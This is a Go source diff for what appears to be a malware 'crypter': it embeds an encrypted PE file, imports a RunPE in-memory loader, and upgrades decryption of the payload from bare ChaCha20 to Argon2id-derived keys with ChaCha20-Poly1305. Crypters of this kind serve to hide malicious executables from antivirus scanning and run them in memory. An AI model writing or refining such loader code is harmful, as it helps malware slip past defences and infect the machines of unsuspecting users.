@@ -2,17 +2,31 @@ package main
 
 import (
 	_ "embed"
+	"encoding/hex"
+	"fmt"
 	"log"
+	"strings"
+	"os"
+	"path/filepath"
 
-	"golang.org/x/crypto/chacha20"
+	"golang.org/x/crypto/argon2"
+	"golang.org/x/crypto/chacha20poly1305"
 	"crypter/internal/runpe"
 )
 
 //go:embed encrypted_Input.bin
 var encryptedBytes []byte
 
-//go:embed key.txt
-var keyData []byte
+//go:embed config.txt
+var configData string
+
+// Default Argon2 parameters
+const (
+	argonTime    = 1
+	argonMemory  = 64 * 1024
+	argonThreads = 4
+	argonKeyLen  = chacha20poly1305.KeySize
+)
 
 func main() {
 	peBytes, err := decryptFile()
@@ -23,16 +37,40 @@ func main() {
 }
 
 func decryptFile() ([]byte, error) {
-	keyBytes := keyData[:32]
-	nonceBytes := keyData[32:44]
+	// Parse config data (password, salt, nonce)
+	lines := strings.Split(strings.TrimSpace(configData), "\n")
+	if len(lines) < 3 {
+		return nil, fmt.Errorf("invalid config data format")
+	}
 
-	cipher, err := chacha20.NewUnauthenticatedCipher(keyBytes, nonceBytes)
+	password, err := hex.DecodeString(lines[0])
 	if err != nil {
 		return nil, err
 	}
 
-	decryptedBytes := make([]byte, len(encryptedBytes))
-	cipher.XORKeyStream(decryptedBytes, encryptedBytes)
+	salt, err := hex.DecodeString(lines[1])
+	if err != nil {
+		return nil, err
+	}
+
+	nonce, err := hex.DecodeString(lines[2])
+	if err != nil {
+		return nil, err
+	}
+
+	// Derive the key using the same Argon2id parameters
+	key := argon2.IDKey(password, salt, argonTime, argonMemory, argonThreads, argonKeyLen)
+
+	aead, err := chacha20poly1305.New(key)
+	if err != nil {
+		return nil, err
+	}
+
+	// Decrypt and verify the data
+	decryptedBytes, err := aead.Open(nil, nonce, encryptedBytes, nil)
+	if err != nil {
+		return nil, err
+	}
 
 	return decryptedBytes, nil
 }
